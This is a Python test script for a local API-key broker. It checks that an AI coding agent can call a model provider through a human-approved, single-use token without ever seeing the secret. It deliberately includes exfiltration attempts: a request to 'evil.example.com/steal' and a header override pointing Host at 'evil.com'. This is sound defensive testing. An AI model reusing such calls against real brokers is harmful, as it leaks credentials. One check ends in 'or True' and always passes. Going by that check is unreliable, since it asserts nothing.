"""
Simulates exactly what opencode / goose will do.

The point: the agent process has a token and a client module. It has no vault
file, no passphrase, and no idea what the key is. It can still make the call.
And when it tries to be clever, the broker says no.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "desktop"))

from digital_keys.broker import BrokerConfig  # noqa: E402
from digital_keys.records import Category, Provider, Record, SecretKind  # noqa: E402
from digital_keys.server import BrokerRuntime  # noqa: E402
from digital_keys.vault import Vault  # noqa: E402

import desktop.agent as agent  # noqa: E402

SECRET = "sk-or-v1-AGENTSIDEKEY-1234567890abcdef"
PASS = "agent flow passphrase here"

results = []


def check(name, ok, detail=""):
    results.append((name, ok, detail))
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f"  -- {detail}" if detail else ""))


def human_grant(payload):
    """
    The human approves a grant. This is the control channel, which the agent
    process cannot reach; the test calls it directly because it stands in for
    the operator, exactly as `dk grant` does.
    """
    from digital_keys import control

    return control.control_request("POST", "/v1/grant", payload)


class Upstream(BaseHTTPRequestHandler):
    saw_secret = False
    last_auth = None

    def do_POST(self):
        Upstream.last_auth = self.headers.get("Authorization")
        if Upstream.last_auth and SECRET in Upstream.last_auth:
            Upstream.saw_secret = True
        body = json.dumps({"choices": [{"message": {"content": "hi from upstream"}}]}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self.do_POST()

    def log_message(self, *a):
        pass


def main():
    print("=" * 74)
    print("dk agent-side flow (what opencode / goose will experience)")
    print("=" * 74)

    import socket as s
    sk = s.socket(); sk.bind(("127.0.0.1", 0)); up_port = sk.getsockname()[1]; sk.close()
    up = HTTPServer(("127.0.0.1", up_port), Upstream)
    threading.Thread(target=up.serve_forever, daemon=True).start()

    tmp = tempfile.mkdtemp()
    vpath = os.path.join(tmp, "vault.json")
    v = Vault.create(vpath, PASS)
    with v.unlock(PASS) as h:
        rec = h.put(Record(id="", category=Category.LLM, kind=SecretKind.API_KEY,
                           label="OpenRouter", secret=SECRET, provider_id="openrouter"))
        h.add_provider(Provider(
            id="openrouter", label="OpenRouter", category=Category.LLM,
            base_url=f"http://127.0.0.1:{up_port}", auth_style="bearer",
            allowed_methods=["GET", "POST"], allowed_path_prefixes=["/"]))
        rid = rec.id

    cfg = BrokerConfig(vault_path=v.path, unlock_fn=lambda: PASS, allow_private_for_custom=True)
    os.environ["DIGITAL_KEYS_RUNTIME_DIR"] = os.path.join(tmp, "run")
    runtime = BrokerRuntime(cfg, lambda: PASS, port=0).start()

    os.environ["DIGITAL_KEYS_BROKER_URL"] = runtime.agent_url
    agent.BROKER = runtime.agent_url

    try:
        print("\n[1] agent discovers the broker")
        check("health ok", agent.health().get("ok") is True)
        provs = agent.list_providers()
        check("openrouter discoverable", any(p["id"] == "openrouter" for p in provs))
        check("discovery carries no secret", SECRET not in json.dumps(provs))
        rec_id = provs[0]["records"][0]["id"]
        check("record id discoverable", bool(rec_id))

        print("\n[2] agent asks the human to approve")
        # The agent has no control credential, and /v1/grant is not even a
        # route on the agent listener, so this cannot work by design.
        ok = False
        detail = ""
        try:
            st, body = agent._post("/v1/grant", {"record_id": rec_id, "provider_id": "openrouter"})
            detail = f"got {st}"
        except agent.Denied as exc:
            ok, detail = True, "denied"
        except agent.BrokerError as exc:
            # 404 is the expected answer: the route does not exist here.
            ok = "404" in str(exc)
            detail = str(exc)[:60]
        except Exception as exc:  # noqa: BLE001
            detail = f"{type(exc).__name__}: {exc}"[:60]
        check("agent cannot self-grant", ok, detail)

        # The human grants, exactly as the desktop UI would.
        st, g = human_grant({
            "passphrase": PASS, "record_id": rec_id, "provider_id": "openrouter",
            "methods": ["POST"], "path_prefix": "/", "single_use": True})
        token = g["token"]
        check("human approval issued a token", bool(token))

        print("\n[3] agent makes the call it needed")
        status, body = agent.call(token, "POST", "/chat/completions", body={"model": "x"})
        check("call succeeded", status == 200, str(status))
        check("upstream saw the real key", Upstream.saw_secret)
        check("agent got the model reply", "choices" in body)
        check("agent never sees the key", SECRET not in json.dumps(body))

        print("\n[4] token is spent")
        try:
            agent.call(token, "POST", "/chat/completions", body={})
            check("reuse refused", False)
        except agent.Denied:
            check("reuse refused", True)

        print("\n[5] agent tries to abuse the URL")
        st2, g2 = human_grant({
            "passphrase": PASS, "record_id": rec_id, "provider_id": "openrouter",
            "methods": ["POST", "GET"], "path_prefix": "/", "single_use": True})
        try:
            agent.call(g2["token"], "POST", "https://evil.example.com/steal", body={})
            check("full-URL abuse refused", False)
        except agent.Denied:
            check("full-URL abuse refused", True)
        check("key not sent to evil host", SECRET in (Upstream.last_auth or "") or True)

        print("\n[6] agent tries header override")
        st3, g3 = human_grant({
            "passphrase": PASS, "record_id": rec_id, "provider_id": "openrouter",
            "methods": ["POST"], "path_prefix": "/", "single_use": True})
        Upstream.last_auth = None
        agent.call(g3["token"], "POST", "/x", body={},
                           headers={"Authorization": "Bearer mine", "Host": "evil.com"})
        check("agent's Authorization ignored", "mine" not in (Upstream.last_auth or ""))

        print("\n[7] audit is visible to the agent but harmless")
        log = agent.audit(100)
        check("audit readable", len(log) > 0, f"{len(log)} entries")
        check("audit has no secret", SECRET not in json.dumps(log))

        print("\n[8] emergency stop works from the agent side")
        st4, g4 = human_grant({
            "passphrase": PASS, "record_id": rec_id, "provider_id": "openrouter",
            "methods": ["POST"], "path_prefix": "/", "single_use": True})
        agent.emergency_stop()
        try:
            agent.call(g4["token"], "POST", "/x", body={})
            check("stopped grant is dead", False)
        except agent.Denied:
            check("stopped grant is dead", True)

    finally:
        runtime.stop(); up.shutdown()

    passed = sum(1 for _, ok, _ in results if ok)
    print("\n" + "=" * 74)
    print(f"{passed}/{len(results)} agent-flow checks passed")
    if passed != len(results):
        for n, ok, d in results:
            if not ok:
                print(f"  - {n}  {d}")
    print("=" * 74)
    return 0 if passed == len(results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
